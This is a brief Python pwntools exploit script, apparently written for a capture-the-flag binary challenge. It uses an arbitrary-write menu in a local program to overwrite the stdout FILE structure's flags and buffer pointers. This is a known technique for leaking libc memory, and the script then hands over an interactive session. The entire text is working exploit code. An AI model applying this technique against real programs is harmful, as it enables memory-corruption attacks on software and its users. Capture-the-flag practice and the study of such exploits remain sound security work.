from pwn import *
context.log_level="debug"

p = process("./prog")

def write(addr, data):
  p.sendlineafter('choice> ', '1')
  p.sendlineafter('> ', str(addr))
  p.sendlineafter('size> ', str(len(data))+'\x00')
  p.sendafter('data> ', data)

# use given leak for experiments, will need no leak on real challenge
p.recvuntil('leak: ', drop=True)
stdout = int(p.recvuntil('\n',drop=True),16)

payload = p64(0xfbad1887)+p64(0)*3+p8(0)
write(stdout, payload)

p.interactive()

